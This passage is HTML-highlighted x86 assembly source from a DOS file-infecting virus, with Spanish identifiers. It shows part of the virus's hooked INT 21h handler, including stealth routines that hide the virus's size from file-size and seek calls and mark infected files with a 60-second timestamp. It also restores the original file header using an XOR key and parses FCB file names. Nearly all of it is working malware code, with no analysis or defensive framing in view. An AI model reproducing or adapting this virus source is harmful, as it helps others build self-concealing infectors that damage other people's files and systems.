        </span><span class="sc6">PUSHF</span><span class="sc0">                 </span><span class="sc1">; Save registers and flags</span><span class="sc0">
        </span><span class="sc6">PUSHA</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetSFT</span><span class="sc0">            </span><span class="sc1">; Get SFT on ES:DI</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">    </span><span class="sc5">@@Salida2</span><span class="sc0">           </span><span class="sc1">; If error, exit</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">TamanyoReal</span><span class="sc0">       </span><span class="sc1">; Get in AX the virus size</span><span class="sc0">
                          </span><span class="sc1">; for this file</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">  </span><span class="sc1">; Add virus size to file size</span><span class="sc0">
        </span><span class="sc6">ADC</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">00</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">            </span><span class="sc1">; Save DS</span><span class="sc0">
        </span><span class="sc6">LDS</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Puntero3</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get saved pointer</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">            </span><span class="sc1">; AX=DS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">            </span><span class="sc1">; Restore DS</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; If read function didn't read any-</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Salida2</span><span class="sc0">      </span><span class="sc1">; thing from the file header, exit</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc0">
        </span><span class="sc6">JAE</span><span class="sc0">   </span><span class="sc5">@@Salida2</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">SaltoCOM</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0"> </span><span class="sc1">; Save low word of</span><span class="sc0">
                              </span><span class="sc1">; file pointer</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">       </span><span class="sc1">; Put read-buffer offset in SI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">       </span><span class="sc1">; Put read-buffer segment in BP</span><span class="sc0">
        </span><span class="sc6">LDS</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Load file pointer in DS-DX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Puntero3</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0"> </span><span class="sc1">; Save current file pointer</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Puntero3</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CambiaAtributos</span><span class="sc0">  </span><span class="sc1">; Change attributes and access mode</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PtrCasiFinal</span><span class="sc0">     </span><span class="sc1">; Put file pointer to (end - 1Ah)</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">       </span><span class="sc1">; Read stored original header</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">NewVirus</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001Ah</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">    </span><span class="sc5">@@Salida3</span><span class="sc0">      </span><span class="sc1">; If error, exit</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">       </span><span class="sc1">; Put the read-buffer segment in DS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">       </span><span class="sc1">; Put in BP the direction where the</span><span class="sc0">
                     </span><span class="sc1">; original header has been read</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">SaltoCOM</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Add to BP the low</span><span class="sc0">
                      </span><span class="sc1">; word of the file pointer</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0018h</span><span class="sc0">   </span><span class="sc1">; Put in CX the value (18h-low_word...)</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">SaltoCOM</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">NewVirus</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get encrypt key</span><span class="sc0">
  </span><span class="sc5">@@LoopE02</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Copy original header to the read buffer</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">  </span><span class="sc5">@@LoopE02</span><span class="sc0">
</span><span class="sc5">@@Salida3</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">RestauraAtributos</span><span class="sc0"> </span><span class="sc1">; Restore file attributes</span><span class="sc0">
        </span><span class="sc6">LDS</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Puntero3</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Restore file pointer</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Salida2</span><span class="sc0">     </span><span class="sc1">; Jump and exit</span><span class="sc0">

</span><span class="sc1">;; Memory write zone</span><span class="sc0">
</span><span class="sc5">Basura13</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;;;;; POINTER SEEK STEALTH</span><span class="sc0">

</span><span class="sc5">@@Salida</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">     </span><span class="sc1">; Restore registers and jump to original int 21h</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POPA</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@FinInt21h</span><span class="sc0">
</span><span class="sc5">@@StealthPuntero</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0004</span><span class="sc0">   </span><span class="sc1">; System handle?</span><span class="sc0">
        </span><span class="sc6">JBE</span><span class="sc0">   </span><span class="sc5">@@FinInt21h</span><span class="sc0">  </span><span class="sc1">; If it is, exit</span><span class="sc0">
        </span><span class="sc6">PUSHA</span><span class="sc0">          </span><span class="sc1">; Save registers</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetSFT</span><span class="sc0">     </span><span class="sc1">; Get SFT of the handle in ES:DI</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">    </span><span class="sc5">@@Salida</span><span class="sc0">     </span><span class="sc1">; If error, exit</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">0Dh</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get seconds in AL</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Fh</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Eh</span><span class="sc0">    </span><span class="sc1">; Seconds=60?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Salida</span><span class="sc0">     </span><span class="sc1">; If the file is not infected, exit</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">TamanyoReal</span><span class="sc0"> </span><span class="sc1">; Get size of the virus in this file</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">  </span><span class="sc1">; Subtract this value to the</span><span class="sc0">
        </span><span class="sc6">SBB</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">00</span><span class="sc0"> </span><span class="sc1">; file size</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">      </span><span class="sc1">; Perform the int 21h function</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POPA</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">
        </span><span class="sc6">PUSHA</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetSFT</span><span class="sc0">      </span><span class="sc1">; Get SFT, blah, blah...</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">    </span><span class="sc5">@@Salida2</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">TamanyoReal</span><span class="sc0"> </span><span class="sc1">; Get virus size...</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0"> </span><span class="sc1">; Recover original file size</span><span class="sc0">
        </span><span class="sc6">ADC</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">00</span><span class="sc0">
</span><span class="sc5">@@Salida2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">      </span><span class="sc1">; Recover registers</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POPA</span><span class="sc0">
        </span><span class="sc6">POPF</span><span class="sc0">
        </span><span class="sc6">RETF</span><span class="sc0">    </span><span class="sc2">0002</span><span class="sc0">        </span><span class="sc1">; Interrupt return</span><span class="sc0">

</span><span class="sc1">;;;;; STEALTH FOR FUNCTION 23h</span><span class="sc0">

</span><span class="sc5">@@TamanyoArchivoFCB</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">   </span><span class="sc1">; Perform function</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">PUSHA</span><span class="sc0">         </span><span class="sc1">; Save registers</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">    </span><span class="sc1">; Error? (AL=FF)</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@HayError03</span><span class="sc0"> </span><span class="sc1">; If error, exit</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">DirecDTA</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get DTA address</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">DirecDTA</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0"> </span><span class="sc1">; If extended MCB, add 7 to address</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@SaltoDIR7</span><span class="sc0">       </span><span class="sc1">; to handle both normal and exten-</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0007h</span><span class="sc0">       </span><span class="sc1">; ded ones</span><span class="sc0">
 </span><span class="sc5">@@SaltoDIR7</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0017h</span><span class="sc0">       </span><span class="sc1">; Check if seconds=60</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Fh</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Eh</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@HayError03</span><span class="sc0">      </span><span class="sc1">; If not, exit</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">00</span><span class="sc0"> </span><span class="sc1">; Check if file size is too</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@SaltoDIR8</span><span class="sc0">          </span><span class="sc1">; small</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">LongVirus</span><span class="sc4">+</span><span class="sc2">1000h</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">@@HayError03</span><span class="sc0">  </span><span class="sc1">; If it is, exit</span><span class="sc0">
 </span><span class="sc5">@@SaltoDIR8</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get virus size for this file</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1FE0h</span><span class="sc0">
        </span><span class="sc6">ROR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LongVirus2</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">      </span><span class="sc1">; DX=0</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get size of size fields</span><span class="sc0">
        </span><span class="sc6">DIV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">      </span><span class="sc1">; Divide file size by size fields</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">      </span><span class="sc1">; Round AX</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@SaltoDIR9</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
 </span><span class="sc5">@@SaltoDIR9</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">21h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0"> </span><span class="sc1">; Subtract virus size from file</span><span class="sc0">
        </span><span class="sc6">JNC</span><span class="sc0">   </span><span class="sc5">@@HayError03</span><span class="sc0">        </span><span class="sc1">; size</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">23h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">@@HayError03</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">      </span><span class="sc1">; Recover registers</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POPA</span><span class="sc0">
        </span><span class="sc6">IRET</span><span class="sc0">            </span><span class="sc1">; Interrupt return</span><span class="sc0">

</span><span class="sc5">NewInt21h</span><span class="sc0">   </span><span class="sc9">ENDP</span><span class="sc0">        </span><span class="sc1">;; END OF NEW INTERRUPT 21h</span><span class="sc0">

</span><span class="sc1">;; Memory write zone</span><span class="sc0">
</span><span class="sc5">Basura14</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;; Procedure to get a file name from a FCB</span><span class="sc0">
</span><span class="sc5">ObtenNombreFCB</span><span class="sc0">  </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0"> </span><span class="sc1">; Add 7 if extended FCB</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@SaltoFCB_001</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0007</span><span class="sc0">
</span><span class="sc5">@@SaltoFCB_001</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">          </span><span class="sc1">; File name in BX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">NombreFCB</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">; Place where the name will</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">              </span><span class="sc1">; be stored</span><span class="sc0">
        </span><span class="sc6">CLD</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0008</span><span class="sc0">          </span><span class="sc1">; Max length of name on a FCB</span><span class="sc0">
</span><span class="sc5">@@LoopFCB_01</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">LODSB</span><span class="sc0">           </span><span class="sc1">; Check if space</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@FinLoopFCB</span><span class="sc0">  </span><span class="sc1">; If space, end loop</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">           </span><span class="sc1">; Store character</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">  </span><span class="sc5">@@LoopFCB_01</span><span class="sc0">
</span><span class="sc5">@@FinLoopFCB</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0">         </span><span class="sc1">; Extension</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
